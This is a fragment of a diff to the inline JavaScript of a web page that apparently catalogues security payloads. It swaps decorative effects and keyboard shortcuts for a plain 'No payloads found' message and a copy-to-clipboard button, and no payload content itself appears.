-                    <div style="text-align: center; padding: 3rem; color: #ff4444;">
-                        <h3>🔍 No payloads found</h3>
-                        <p>Try adjusting your search terms</p>
-                    </div>
-                `;
-                document.getElementById('payloadGrid').appendChild(noResultsDiv);
-            }
-        }
-
-        function hideNoResults() {
-            const noResultsDiv = document.getElementById('no-results');
-            if (noResultsDiv) {
-                noResultsDiv.remove();
-            }
-        }
-
-        // Keyboard shortcuts
-        document.addEventListener('keydown', function(e) {
-            // Ctrl+K or Cmd+K to focus search
-            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
-                e.preventDefault();
-                document.getElementById('searchInput').focus();
-            }
-
-            // Escape to clear search
-            if (e.key === 'Escape') {
-                const searchInput = document.getElementById('searchInput');
-                searchInput.value = '';
-                searchInput.dispatchEvent(new Event('input'));
-                searchInput.blur();
+            if (results === 0) {
+                if (!document.getElementById('noResults')) {
+                    const div = document.createElement('div');
+                    div.id = 'noResults';
+                    div.textContent = 'No payloads found.';
+                    div.style.color = '#ff4444';
+                    div.style.textAlign = 'center';
+                    div.style.margin = '2rem';
+                    document.querySelector('.grid').appendChild(div);
+                }
+            } else {
+                const noResults = document.getElementById('noResults');
+                if (noResults) noResults.remove();
             }
         });
 
-        // Initialize all effects
-        document.addEventListener('DOMContentLoaded', function() {
-            createMatrixEffect();
-            createParticles();
-            initializeSearch();
-
-            // Add smooth scrolling
-            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-                anchor.addEventListener('click', function (e) {
-                    e.preventDefault();
-                    document.querySelector(this.getAttribute('href')).scrollIntoView({
-                        behavior: 'smooth'
-                    });
-                });
+        // Copy payload
+        function copyPayload(btn) {
+            const text = btn.parentElement.textContent.replace('📋','').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = '✅';
+                setTimeout(()=>{btn.textContent = '📋';}, 1200);
             });
-        });
-
-        // Performance optimization
-        let ticking = false;
-
-        function updateOnScroll() {
-            // Add scroll-based animations here if needed
-            ticking = false;
         }
-
-        document.addEventListener('scroll', function() {
-            if (!ticking) {
-                requestAnimationFrame(updateOnScroll);
-                ticking = true;
-            }
-        });
     </script>
 </body>
 </html>
